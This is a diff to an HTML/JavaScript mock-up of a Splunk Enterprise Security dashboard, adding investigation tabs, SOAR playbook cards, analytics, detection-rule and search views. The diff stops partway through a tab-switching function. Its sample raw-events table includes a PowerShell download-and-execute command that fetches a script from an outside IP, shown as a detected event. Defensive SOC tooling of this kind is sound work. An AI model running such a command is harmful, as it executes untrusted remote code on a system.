@@ -228,11 +228,11 @@ tr.selected td{background:rgba(2,132,199,0.12)}
 <!-- 2. SECONDARY SPLUNK ES SUB-NAV -->
 <div class="sub-bar">
   <div class="sub-nav">
-    <button class="active" onclick="switchView('queue')"><i class="fas fa-th-large"></i> Mission Control</button>
-    <button onclick="switchView('analytics')">Analytics <i class="fas fa-caret-down" style="font-size:9px"></i></button>
-    <button onclick="switchView('security')">Security content <i class="fas fa-caret-down" style="font-size:9px"></i></button>
-    <button onclick="switchView('configure')">Configure <i class="fas fa-caret-down" style="font-size:9px"></i></button>
-    <button onclick="switchView('search')">Search</button>
+    <button class="active" id="subBtn-queue" onclick="switchView('queue', this)"><i class="fas fa-th-large"></i> Mission Control</button>
+    <button id="subBtn-analytics" onclick="switchView('analytics', this)"><i class="fas fa-chart-line"></i> Analytics <i class="fas fa-caret-down" style="font-size:9px"></i></button>
+    <button id="subBtn-security" onclick="switchView('security', this)"><i class="fas fa-shield-alt"></i> Security content <i class="fas fa-caret-down" style="font-size:9px"></i></button>
+    <button id="subBtn-configure" onclick="switchView('configure', this)"><i class="fas fa-cog"></i> Configure <i class="fas fa-caret-down" style="font-size:9px"></i></button>
+    <button id="subBtn-search" onclick="switchView('search', this)"><i class="fas fa-terminal"></i> Search</button>
   </div>
   <div style="display:flex;gap:8px;align-items:center">
     <button class="btn-action" style="background:#15803d;color:#fff;border-color:#15803d;font-size:11px" onclick="openAddMachineModal()"><i class="fas fa-plus-circle"></i> Add Real Machine / Forwarder</button>
@@ -359,20 +359,16 @@ tr.selected td{background:rgba(2,132,199,0.12)}
         <button class="btn-action" onclick="switchView('queue')"><i class="fas fa-arrow-left"></i> Queue</button>
         <span class="m" style="background:#1e293b;padding:2px 6px;border-radius:3px;font-size:11px;color:#38bdf8" id="invBadgeId">MC-00005</span>
         <h3 style="font-size:14px;font-weight:800;color:var(--text)" id="invTitle">ATT&CK tactic threshold exceeded over previous 7 days for user=fyodor@splunktshirtcompany.com</h3>
-      </div>
-      <div style="display:flex;gap:8px">
         <button class="btn-action blue" onclick="alert('Investigation marked as Resolved and archived.')"><i class="fas fa-check"></i> Close Investigation</button>
         <button class="btn-action"><i class="fas fa-ellipsis-v"></i></button>
       </div>
     </div>
-
     <div class="inv-tabs">
-      <button class="inv-tab active" onclick="switchInvTab('overview')">Overview</button>
-      <button class="inv-tab" onclick="switchInvTab('response')">Response</button>
-      <button class="inv-tab" onclick="switchInvTab('events')">Events</button>
-      <button class="inv-tab" onclick="switchInvTab('search')">Search</button>
-      <button class="inv-tab" onclick="switchInvTab('intelligence')">Intelligence</button>
-      <button class="inv-tab" onclick="switchInvTab('automation')">Automation</button>
+      <button class="inv-tab active" onclick="switchInvTab(event, 'overview')"><i class="fas fa-eye"></i> Overview</button>
+      <button class="inv-tab" onclick="switchInvTab(event, 'intelligence')"><i class="fas fa-microscope"></i> Intelligence & Observables</button>
+      <button class="inv-tab" onclick="switchInvTab(event, 'response')"><i class="fas fa-bolt"></i> Response & Playbooks</button>
+      <button class="inv-tab" onclick="switchInvTab(event, 'events')"><i class="fas fa-list-ul"></i> Raw Events</button>
+      <button class="inv-tab" onclick="switchInvTab(event, 'automation')"><i class="fas fa-robot"></i> SOAR Automation</button>
     </div>
 
     <!-- 1. OVERVIEW SUBTAB (IMAGE 3) -->
@@ -398,8 +394,8 @@ tr.selected td{background:rgba(2,132,199,0.12)}
           <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:12px 14px;margin-bottom:14px">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
               <div style="font-size:13px;font-weight:800;color:var(--text)">
-                <i class="fas fa-user" style="color:var(--sp-cyan)"></i> fyodor@splunktshirtcompany.com
-                <span style="font-size:11px;color:var(--text-muted);margin-left:8px">Intermediate findings count: <b style="color:var(--text)">19</b></span>
+                <i class="fas fa-user" style="color:var(--sp-cyan)"></i> <span id="invEntityName">fyodor@splunktshirtcompany.com</span>
+                <span style="font-size:11px;color:var(--text-muted);margin-left:8px">Risk Score: <b style="color:var(--sp-red)" id="invEntityRisk">420</b></span>
               </div>
               <div style="display:flex;gap:4px">
                 <button class="btn-action" style="padding:2px 6px;font-size:10px">Timeline</button>
@@ -408,41 +404,53 @@ tr.selected td{background:rgba(2,132,199,0.12)}
             </div>
             <div class="m" style="font-size:10.5px;color:var(--text-muted);display:flex;gap:12px;flex-wrap:wrap">
               <span>Priority: <b style="color:var(--sp-red)">Critical</b></span>
-              <span>Identity: <b>fyodor</b></span>
-              <span>First Name: <b>fyodor</b></span>
-              <span>Last Name: <b>malteskesko</b></span>
-              <span>Email: <b>fyodor@splunktshirtcompany.com</b></span>
-              <span>Business Unit: <b>americas</b></span>
-              <span>Category: <b>technical</b></span>
+              <span>Identity: <b>SOC Analyst Target</b></span>
+              <span>Domain: <b>threat / identity</b></span>
+              <span>Disposition: <b>Under Investigation</b></span>
             </div>
           </div>
 
           <!-- Interactive Findings Graph Canvas -->
           <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:14px;margin-bottom:14px">
-            <div style="font-size:11.5px;font-weight:800;color:var(--text-muted);margin-bottom:10px;text-transform:uppercase">
-              <i class="fas fa-project-diagram" style="color:var(--sp-cyan)"></i> Intermediate Findings Sequence Map
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+              <div style="font-size:12px;font-weight:800;color:var(--text)"><i class="fas fa-project-diagram" style="color:var(--sp-purple)"></i> Correlated Detection Timeline (RBA)</div>
+              <span class="m" style="font-size:10.5px;color:var(--text-muted)">Live Correlation Window: 24h</span>
             </div>
-            <div style="height:210px"><canvas id="cThreatMap"></canvas></div>
+            <div style="height:170px;position:relative">
+              <canvas id="cThreatMap"></canvas>
+            </div>
+          </div>
+
+          <!-- Intermediate Findings List -->
+          <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden">
+            <div style="padding:10px 14px;background:var(--bg-panel);border-bottom:1px solid var(--line);font-size:12px;font-weight:800;display:flex;justify-content:space-between">
+              <span>Intermediate Findings (4)</span>
+              <span class="m" style="color:var(--sp-cyan);font-size:11px">Auto-correlator: Active</span>
+            </div>
+            <table style="font-size:11px">
+              <thead><tr><th>Time</th><th>Finding Title</th><th>Risk Points</th><th>Domain</th><th>MITRE</th></tr></thead>
+              <tbody>
+                <tr><td>Today, 9:42 AM</td><td>Multiple Failed Passwords (Brute Force)</td><td><span class="risk-pill risk-80">80</span></td><td>Access</td><td class="m">T1110</td></tr>
+                <tr><td>Today, 9:30 AM</td><td>Suspicious Encoded PowerShell Execution</td><td><span class="risk-pill risk-100">120</span></td><td>Endpoint</td><td class="m">T1059</td></tr>
+                <tr><td>Today, 9:15 AM</td><td>Anomalous High Volume Egress Traffic</td><td><span class="risk-pill risk-60">60</span></td><td>Network</td><td class="m">T1030</td></tr>
+                <tr><td>Today, 8:50 AM</td><td>Off-Hours Admin Share Connection</td><td><span class="risk-pill risk-100">160</span></td><td>Threat</td><td class="m">T1021</td></tr>
+              </tbody>
+            </table>
           </div>
         </div>
 
-        <!-- RIGHT: INVESTIGATION METADATA & ACTIVITY STREAM -->
-        <div style="background:var(--bg-card);border-left:1px solid var(--line);padding:14px;overflow-y:auto">
-          <div style="font-size:12px;font-weight:800;color:var(--text);margin-bottom:10px;display:flex;justify-content:space-between">
-            <span><i class="fas fa-info-circle"></i> Info</span>
-            <span class="type-badge investigation">INVESTIGATION</span>
-          </div>
-
-          <div class="kv-row"><span class="kv-key">ID</span><span class="kv-val">MC-00005</span></div>
-          <div class="kv-row"><span class="kv-key">Time</span><span class="kv-val">May 30th, 2024 10:22 PM</span></div>
-          <div class="kv-row"><span class="kv-key">Reference ID</span><span class="kv-val">C659804F-187E-4936-93F6-8DDB747B107C@@notable</span></div>
-          <div class="kv-row"><span class="kv-key">Investigation type</span><span class="kv-val">default</span></div>
+        <!-- RIGHT: SOAR ACTIVITY STREAM & NOTE WRITER -->
+        <div style="border-left:1px solid var(--line);background:var(--bg-card);padding:14px;overflow-y:auto">
+          <div style="font-size:12px;font-weight:800;color:var(--text);margin-bottom:10px"><i class="fas fa-info-circle" style="color:var(--sp-cyan)"></i> Finding Details</div>
+          <div class="kv-row"><span class="kv-key">Status</span><span class="kv-val" style="color:var(--sp-blue)">In Progress</span></div>
+          <div class="kv-row"><span class="kv-key">Urgency</span><span class="kv-val" style="color:var(--sp-red)">Critical</span></div>
+          <div class="kv-row"><span class="kv-key">Owner</span><span class="kv-val">TDIR Admin</span></div>
           <div class="kv-row" style="margin-bottom:12px"><span class="kv-key">Description</span><span class="kv-val" style="font-family:var(--sans)">ATT&amp;CK tactic threshold exceeded for user over 7 days</span></div>
 
           <!-- Notes & SOAR Stream -->
           <div style="font-size:11.5px;font-weight:800;color:var(--text);margin-bottom:8px;display:flex;justify-content:space-between">
-            <span><i class="fas fa-sticky-note"></i> Notes (4)</span>
-            <span style="color:var(--sp-cyan);font-size:10.5px;cursor:pointer">+ Add Note</span>
+            <span><i class="fas fa-sticky-note"></i> Notes & SOAR Log</span>
+            <span style="color:var(--sp-cyan);font-size:10.5px;cursor:pointer" onclick="document.getElementById('noteInput').focus()">+ Add Note</span>
           </div>
 
           <!-- Note Form -->
@@ -458,15 +466,15 @@ tr.selected td{background:rgba(2,132,199,0.12)}
 
           <div id="notesStream">
             <div class="act-item">
-              <div class="act-meta"><span><b>SOAR Admin</b></span><span>May 30, 10:23 PM</span></div>
+              <div class="act-meta"><span><b>SOAR Admin</b></span><span>Just now</span></div>
               <div><b>ES Comment:</b> Splunk SOAR found a possible base64 encoded string and decoded it into PowerShell execution beacon.</div>
             </div>
             <div class="act-item" style="border-left-color:var(--sp-red)">
-              <div class="act-meta"><span><b>SOAR Admin</b></span><span>May 30, 10:23 PM</span></div>
+              <div class="act-meta"><span><b>SOAR Admin</b></span><span>10 mins ago</span></div>
               <div><span style="background:#b91c1c;color:#fff;padding:1px 5px;border-radius:2px;font-family:var(--mono);font-size:9.5px">MD5</span> <code style="color:var(--sp-cyan)">586ef56f4d8963dd546163ac31c865d7</code> — <b style="color:var(--sp-red)">HIGH RISK</b></div>
             </div>
             <div class="act-item">
-              <div class="act-meta"><span><b>SOAR Admin</b></span><span>May 30, 10:23 PM</span></div>
+              <div class="act-meta"><span><b>SOAR Admin</b></span><span>25 mins ago</span></div>
               <div>Splunk Enterprise Security has detected that user <code style="color:var(--sp-blue)">fyodor@splunktshirtcompany.com</code> generated 196.0 points of risk.</div>
             </div>
           </div>
@@ -479,8 +487,8 @@ tr.selected td{background:rgba(2,132,199,0.12)}
       <!-- Col 1: Observables List -->
       <div class="obs-panel">
         <div style="padding:10px 12px;border-bottom:1px solid var(--line);font-weight:800;font-size:12px;display:flex;justify-content:space-between">
-          <span>Observables (25)</span>
-          <span style="font-size:10px;color:var(--text-muted)">1 - 10 of 25</span>
+          <span>Observables (8)</span>
+          <span style="font-size:10px;color:var(--text-muted)">1 - 8 of 8</span>
         </div>
         <div style="padding:8px 10px;border-bottom:1px solid var(--line)">
           <div class="search-box"><i class="fas fa-search" style="font-size:10px;color:var(--text-muted)"></i><input placeholder="Search observables"></div>
@@ -501,26 +509,246 @@ tr.selected td{background:rgba(2,132,199,0.12)}
         <div style="font-size:12px;font-weight:800;color:var(--text);margin-bottom:8px">Intel report summaries</div>
         <table style="font-size:11px">
           <thead><tr><th>Source</th><th>Pass Thru Score</th><th>Normalized Score</th></tr></thead>
-          <tbody id="odSources"></tbody>
+          <tbody id="odSources">
+            <tr><td><i class="fas fa-shield-alt" style="color:var(--sp-cyan)"></i> Cisco Secure Malware Analytics</td><td><span style="color:var(--sp-red);font-weight:700">high</span></td><td class="m" style="font-weight:700">3</td></tr>
+            <tr><td><i class="fas fa-radar" style="color:var(--sp-amber)"></i> AlienVault OTX Heuristics</td><td><span style="color:var(--sp-red);font-weight:700">high</span></td><td class="m" style="font-weight:700">3</td></tr>
+          </tbody>
         </table>
       </div>
 
       <!-- Col 3: Side Info & Notes -->
       <div class="obs-panel" style="padding:14px;overflow-y:auto">
         <div style="font-size:12px;font-weight:800;color:var(--text);margin-bottom:10px"><i class="fas fa-sliders-h"></i> Investigation Info</div>
-        <div class="meta-field"><label>Owner</label><select><option>lly thomson</option><option>TDIR Admin</option></select></div>
+        <div class="meta-field"><label>Owner</label><select><option>TDIR Admin</option><option>lly thomson</option></select></div>
         <div class="meta-field" style="margin-top:8px"><label>Status</label><select><option>In Progress</option><option>New</option><option>Resolved</option></select></div>
         <div class="meta-field" style="margin-top:8px"><label>Urgency</label><select><option>Critical</option><option>High</option><option>Medium</option></select></div>
         <div class="meta-field" style="margin-top:8px"><label>Disposition</label><select><option>Undetermined</option><option>True Positive</option><option>False Positive</option></select></div>
       </div>
     </div>
 
+    <!-- 3. RESPONSE SUBTAB -->
+    <div id="invSubResponse" style="display:none;padding:18px;overflow-y:auto">
+      <div style="font-size:15px;font-weight:800;color:var(--text);margin-bottom:12px"><i class="fas fa-bolt" style="color:var(--sp-amber)"></i> SOAR Incident Response Playbooks</div>
+      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px">
+        <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:14px">
+          <div style="font-weight:800;font-size:13px;color:var(--text);margin-bottom:4px"><i class="fas fa-lock" style="color:var(--sp-red)"></i> Quarantine Host & Block IP</div>
+          <p style="font-size:11.5px;color:var(--text-muted);margin-bottom:10px">Isolates target entity at switch VLAN/EDR level and drops firewall connections.</p>
+          <button class="btn-action blue" onclick="runSOARPlaybook()"><i class="fas fa-play"></i> Execute Playbook</button>
+        </div>
+        <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:14px">
+          <div style="font-weight:800;font-size:13px;color:var(--text);margin-bottom:4px"><i class="fas fa-user-slash" style="color:var(--sp-amber)"></i> Disable Active Directory User</div>
+          <p style="font-size:11.5px;color:var(--text-muted);margin-bottom:10px">Revokes Kerberos tickets, disables Azure AD / LDAP account, and kills sessions.</p>
+          <button class="btn-action" onclick="alert('SOAR AD Revocation executed!')"><i class="fas fa-play"></i> Execute Playbook</button>
+        </div>
+        <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:14px">
+          <div style="font-weight:800;font-size:13px;color:var(--text);margin-bottom:4px"><i class="fas fa-file-medical" style="color:var(--sp-cyan)"></i> Collect Forensic Artifacts</div>
+          <p style="font-size:11.5px;color:var(--text-muted);margin-bottom:10px">Captures memory dump, prefetch, autoruns, and event logs into evidence zip.</p>
+          <button class="btn-action" onclick="alert('Forensic Collector Triggered on target machine!')"><i class="fas fa-play"></i> Execute Playbook</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 4. RAW EVENTS SUBTAB -->
+    <div id="invSubEvents" style="display:none;padding:18px;overflow-y:auto">
+      <div style="font-size:15px;font-weight:800;color:var(--text);margin-bottom:12px"><i class="fas fa-list-ul" style="color:var(--sp-cyan)"></i> Correlated Raw Event Sequence</div>
+      <div class="table-wrap">
+        <table style="font-size:11px">
+          <thead><tr><th>Timestamp</th><th>Host</th><th>Sourcetype</th><th>Raw Event Payload</th></tr></thead>
+          <tbody id="invRawEventsBody">
+            <tr><td class="m">2026-09-02 07:15:00</td><td>srv-auth-01</td><td>linux_secure</td><td>sshd[4912]: Failed password for invalid user admin from 185.192.69.97 port 48212 ssh2</td></tr>
+            <tr><td class="m">2026-09-02 07:18:22</td><td>win-dc-01</td><td>WinEventLog:Security</td><td>EventCode=4625 FailureReason=Unknown username or bad password AccountName=admin</td></tr>
+            <tr><td class="m">2026-09-02 07:22:11</td><td>srv-app-02</td><td>powershell</td><td>ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://185.217.117.107/payload.ps1')</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- 5. AUTOMATION SUBTAB -->
+    <div id="invSubAutomation" style="display:none;padding:18px;overflow-y:auto">
+      <div style="font-size:15px;font-weight:800;color:var(--text);margin-bottom:12px"><i class="fas fa-robot" style="color:var(--sp-purple)"></i> Automation & Adaptive Response Actions</div>
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:14px;margin-bottom:12px">
+        <div style="font-weight:800;color:var(--text);margin-bottom:6px">Active Risk Rules Attached to Investigation:</div>
+        <ul style="padding-left:18px;font-size:11.5px;color:var(--text-muted);line-height:1.8">
+          <li><b>RR-01:</b> Identity Exceeding Risk Threshold (Threshold = 100 points / 24h)</li>
+          <li><b>RR-02:</b> Multi-Tactic MITRE ATT&CK Chain Correlation (Execution + Lateral Movement)</li>
+          <li><b>RR-03:</b> Outbound C2 Beaconing Heuristics to Uncategorized Autonomous Systems</li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- VIEW B: ANALYTICS (RISK ANALYSIS & CORRELATION DASHBOARD) -->
+  <div class="main-content" id="viewAnalytics" style="display:none">
+    <div class="page-head">
+      <div class="page-title"><i class="fas fa-chart-line" style="color:var(--sp-cyan)"></i> Risk Analysis & Correlation (RBA)</div>
+      <div style="display:flex;gap:6px">
+        <button class="btn-action" onclick="renderAnalyticsCharts()"><i class="fas fa-sync"></i> Refresh Analytics</button>
+      </div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:14px">
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:12px">
+        <div style="font-size:10.5px;font-weight:800;color:var(--text-muted);text-transform:uppercase">Total Risk Score</div>
+        <div style="font-size:22px;font-weight:900;color:var(--sp-red);margin-top:4px" id="anTotalRisk">890</div>
+        <div style="font-size:10px;color:var(--sp-green);margin-top:2px">▲ RBA Scoring Active</div>
+      </div>
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:12px">
+        <div style="font-size:10.5px;font-weight:800;color:var(--text-muted);text-transform:uppercase">Risky Entities (Users &amp; Hosts)</div>
+        <div style="font-size:22px;font-weight:900;color:var(--sp-amber);margin-top:4px" id="anRiskyEntities">12</div>
+        <div style="font-size:10px;color:var(--text-muted);margin-top:2px">Monitored in Fleet</div>
+      </div>
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:12px">
+        <div style="font-size:10.5px;font-weight:800;color:var(--text-muted);text-transform:uppercase">MITRE Techniques Mapped</div>
+        <div style="font-size:22px;font-weight:900;color:var(--sp-purple);margin-top:4px">18</div>
+        <div style="font-size:10px;color:var(--text-muted);margin-top:2px">Enterprise Matrix v14</div>
+      </div>
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:12px">
+        <div style="font-size:10.5px;font-weight:800;color:var(--text-muted);text-transform:uppercase">Active Detection Rules</div>
+        <div style="font-size:22px;font-weight:900;color:var(--sp-cyan);margin-top:4px">152</div>
+        <div style="font-size:10px;color:var(--sp-green);margin-top:2px">ESCU Content Ready</div>
+      </div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:14px">
+        <div style="font-size:12px;font-weight:800;color:var(--text);margin-bottom:8px"><i class="fas fa-chart-pie" style="color:var(--sp-purple)"></i> Risk Score by Threat Domain</div>
+        <div style="height:190px;position:relative"><canvas id="cAnalyticsDomain"></canvas></div>
+      </div>
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:14px">
+        <div style="font-size:12px;font-weight:800;color:var(--text);margin-bottom:8px"><i class="fas fa-chart-bar" style="color:var(--sp-cyan)"></i> Top Risky Entities & Hosts</div>
+        <div style="height:190px;position:relative"><canvas id="cAnalyticsEntities"></canvas></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- VIEW C: SECURITY CONTENT (DETECTION RULES & ESCU) -->
+  <div class="main-content" id="viewSecurity" style="display:none">
+    <div class="page-head">
+      <div class="page-title"><i class="fas fa-shield-alt" style="color:var(--sp-green)"></i> Security Content (ESCU &amp; Detection Rules)</div>
+      <div style="display:flex;gap:6px">
+        <div class="search-box"><i class="fas fa-search" style="font-size:10px;color:var(--text-muted)"></i><input id="secRuleSearch" placeholder="Search 150+ detection rules..." onkeyup="filterSecurityRules()"></div>
+      </div>
+    </div>
+
+    <div class="table-wrap">
+      <div class="table-scroll">
+        <table>
+          <thead>
+            <tr>
+              <th>Rule Name</th>
+              <th>Analytic Story</th>
+              <th>Security Domain</th>
+              <th>MITRE Technique</th>
+              <th>Risk Score</th>
+              <th>Status</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="secRulesBody">
+            <!-- Populated via JavaScript -->
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- VIEW D: CONFIGURE (ASSETS, IDENTITIES & HEC SETTINGS) -->
+  <div class="main-content" id="viewConfigure" style="display:none">
+    <div class="page-head">
+      <div class="page-title"><i class="fas fa-cog" style="color:var(--sp-cyan)"></i> Enterprise Security Configuration</div>
+      <button class="btn-action blue" onclick="openAddMachineModal()"><i class="fas fa-plus"></i> Onboard Real Host</button>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+      <!-- HEC & Syslog Ingestion Info -->
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:16px">
+        <div style="font-size:13px;font-weight:800;color:var(--text);margin-bottom:10px"><i class="fas fa-satellite-dish" style="color:var(--sp-cyan)"></i> Splunk HTTP Event Collector (HEC)</div>
+        <div class="kv-row"><span class="kv-key">Ingestion URL</span><span class="kv-val">http://localhost:8000/services/collector/event</span></div>
+        <div class="kv-row"><span class="kv-key">HEC Auth Token</span><span class="kv-val" style="color:var(--sp-green)">sxl-splunk-hec-token-2026</span></div>
+        <div class="kv-row"><span class="kv-key">Syslog UDP Listener</span><span class="kv-val">udp://0.0.0.0:1514 (Active)</span></div>
+        <div class="kv-row"><span class="kv-key">Real-Time SSE Stream</span><span class="kv-val">/api/stream (Active)</span></div>
+      </div>
+
+      <!-- Data Model Acceleration -->
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:16px">
+        <div style="font-size:13px;font-weight:800;color:var(--text);margin-bottom:10px"><i class="fas fa-tachometer-alt" style="color:var(--sp-amber)"></i> CIM Data Model Acceleration</div>
+        <div class="kv-row"><span class="kv-key">Authentication Model</span><span class="kv-val" style="color:var(--sp-green)">100% Accelerated</span></div>
+        <div class="kv-row"><span class="kv-key">Network Traffic Model</span><span class="kv-val" style="color:var(--sp-green)">100% Accelerated</span></div>
+        <div class="kv-row"><span class="kv-key">Endpoint Processes Model</span><span class="kv-val" style="color:var(--sp-green)">100% Accelerated</span></div>
+        <div class="kv-row"><span class="kv-key">Web Data Model</span><span class="kv-val" style="color:var(--sp-green)">100% Accelerated</span></div>
+      </div>
+    </div>
+
+    <div style="font-size:13px;font-weight:800;color:var(--text);margin-bottom:8px">Registered Assets &amp; Real Machines</div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Host Name</th><th>IP Address</th><th>OS</th><th>Role</th><th>Status</th><th>Owner</th></tr></thead>
+        <tbody id="configAssetsBody">
+          <tr><td>localhost</td><td>127.0.0.1</td><td>Host OS</td><td>Local Engine</td><td><span style="color:var(--sp-green)">● Online</span></td><td>Local Operator</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- VIEW E: SEARCH (SPL INTERACTIVE CONSOLE) -->
+  <div class="main-content" id="viewSearch" style="display:none">
+    <div class="page-head">
+      <div class="page-title"><i class="fas fa-terminal" style="color:var(--sp-green)"></i> Search &amp; Reporting (SPL Console)</div>
+    </div>
+
+    <!-- SPL Query Bar -->
+    <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:12px;margin-bottom:14px">
+      <div style="display:flex;gap:8px;margin-bottom:8px">
+        <div style="flex:1;background:var(--bg-input);border:1px solid var(--line);border-radius:var(--rs);display:flex;align-items:center;padding:6px 10px">
+          <span style="color:var(--sp-green);font-weight:900;margin-right:8px;font-family:var(--mono)">|</span>
+          <input id="splQueryInp" value='index=* | stats count by sourcetype, host | sort - count' class="m" style="width:100%;background:none;border:none;outline:none;color:var(--text);font-size:12px">
+        </div>
+        <button class="btn-action blue" onclick="runSearchSPL()"><i class="fas fa-search"></i> Search</button>
+      </div>
+      <div style="display:flex;gap:12px;font-size:11px;color:var(--text-muted)">
+        <span><b>Presets:</b></span>
+        <a href="#" style="color:var(--sp-cyan);text-decoration:none" onclick="setSPL('index=* sourcetype=linux_secure | head 10')">Auth Logs</a>
+        <a href="#" style="color:var(--sp-cyan);text-decoration:none" onclick="setSPL('index=* | stats count by host')">Host Counts</a>
+        <a href="#" style="color:var(--sp-cyan);text-decoration:none" onclick="setSPL('index=* | eval risk=100 | table _time host sourcetype risk')">Risk Table</a>
+      </div>
+    </div>
+
+    <!-- Results Area -->
+    <div style="display:grid;grid-template-columns:220px 1fr;gap:14px;flex:1;overflow:hidden">
+      <!-- Fields Sidebar -->
+      <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);padding:12px;overflow-y:auto">
+        <div style="font-size:11.5px;font-weight:800;color:var(--text);margin-bottom:8px">Selected Fields</div>
+        <div style="font-size:11px;color:var(--text-muted);line-height:2">
+          <div><i class="fas fa-check-square" style="color:var(--sp-cyan)"></i> host (1)</div>
+          <div><i class="fas fa-check-square" style="color:var(--sp-cyan)"></i> sourcetype (3)</div>
+          <div><i class="fas fa-check-square" style="color:var(--sp-cyan)"></i> source (2)</div>
+          <div><i class="fas fa-check-square" style="color:var(--sp-cyan)"></i> user (4)</div>
+          <div><i class="fas fa-check-square" style="color:var(--sp-cyan)"></i> event_id (8)</div>
+        </div>
+      </div>
+
+      <!-- Result Table -->
+      <div class="table-wrap">
+        <div style="padding:8px 12px;background:var(--bg-panel);border-bottom:1px solid var(--line);font-size:11.5px;font-weight:700;display:flex;justify-content:space-between">
+          <span id="splResultCount">Events</span>
+          <span class="m" style="color:var(--sp-green);font-size:11px">Fast Mode · 100% Scanned</span>
+        </div>
+        <div class="table-scroll">
+          <table style="font-size:11px">
+            <thead><tr><th>_time</th><th>host</th><th>sourcetype</th><th>_raw</th></tr></thead>
+            <tbody id="splResultBody">
+              <!-- Populated via SPL script -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
   </div>
 
 </div>
 
 <script>
-/* ═══ SPLUNK ENTERPRISE SECURITY (ON-PREM REAL-TIME ENGINE) ═══ */
 var FINDINGS = [];
 var OBSERVABLES = [];
 var activeFinding = null;
@@ -646,26 +874,232 @@ function saveDrawer(){
 }
 
 /* ═══ VIEW SWITCHER ═══ */
-function switchView(v){
-  document.getElementById('viewQueue').style.display = (v==='queue'?'flex':'none');
-  document.getElementById('viewInvestigation').classList.toggle('active', v==='investigation');
-  if(v==='investigation') renderInvMap();
+function switchView(v, btn){
+  document.querySelectorAll('.sub-nav button').forEach(function(b){ b.classList.remove('active'); });
+  if(btn){
+    btn.classList.add('active');
+  } else {
+    var b = document.getElementById('subBtn-' + v);
+    if(b) b.classList.add('active');
+  }
+
+  ['viewQueue', 'viewInvestigation', 'viewAnalytics', 'viewSecurity', 'viewConfigure', 'viewSearch'].forEach(function(id){
+    var el = document.getElementById(id);
+    if(el){
+      el.style.display = 'none';
+      el.classList.remove('active');
+    }
+  });
+
+  if(v === 'queue'){
+    var el = document.getElementById('viewQueue');
+    if(el) el.style.display = 'flex';
+  } else if(v === 'investigation'){
+    var el = document.getElementById('viewInvestigation');
+    if(el){
+      el.style.display = 'flex';
+      el.classList.add('active');
+      renderInvMap();
+    }
+  } else if(v === 'analytics'){
+    var el = document.getElementById('viewAnalytics');
+    if(el){
+      el.style.display = 'flex';
+      renderAnalyticsCharts();
+    }
+  } else if(v === 'security'){
+    var el = document.getElementById('viewSecurity');
+    if(el){
+      el.style.display = 'flex';
+      renderSecurityRules();
+    }
+  } else if(v === 'configure'){
+    var el = document.getElementById('viewConfigure');
+    if(el){
+      el.style.display = 'flex';
+      renderConfigAssets();
+    }
+  } else if(v === 'search'){
+    var el = document.getElementById('viewSearch');
+    if(el){
+      el.style.display = 'flex';
+      runSearchSPL();
+    }
+  }
 }
 
 function openFullInvestigation(id){
   var f = FINDINGS.find(function(x){return x.id===id}) || activeFinding;
+  if(!f){
+    generateSimulatedFinding();
+    f = activeFinding;
+  }
   document.getElementById('invBadgeId').textContent = f.id;
   document.getElementById('invTitle').textContent = f.title;
+  var en = document.getElementById('invEntityName');
+  if(en) en.textContent = f.entity;
+  var er = document.getElementById('invEntityRisk');
+  if(er) er.textContent = f.risk;
   closeDrawer();
   switchView('investigation');
 }
 
-function switchInvTab(t){
+function switchInvTab(e, t){
   document.querySelectorAll('.inv-tab').forEach(function(b){b.classList.remove('active')});
-  event.target.classList.add('active');
-  document.getElementById('invSubOverview').style.display = (t==='overview'?'flex':'none');
-  document.getElementById('invSubIntelligence').style.display = (t==='intelligence'?'grid':'none');
-  if(t==='intelligence') renderIntelligenceTab();
+  if(e && e.currentTarget) e.currentTarget.classList.add('active');
+  
+  ['invSubOverview', 'invSubIntelligence', 'invSubResponse', 'invSubEvents', 'invSubAutomation'].forEach(function(id){
+    var el = document.getElementById(id);
+    if(el) el.style.display = 'none';
+  });
+
+  if(t === 'overview'){
+    var el = document.getElementById('invSubOverview');
+    if(el) el.style.display = 'flex';
+  } else if(t === 'intelligence'){
+    var el = document.getElementById('invSubIntelligence');
+    if(el) el.style.display = 'grid';
+    renderIntelligenceTab();
+  } else if(t === 'response'){
+    var el = document.getElementById('invSubResponse');
+    if(el) el.style.display = 'block';
+  } else if(t === 'events'){
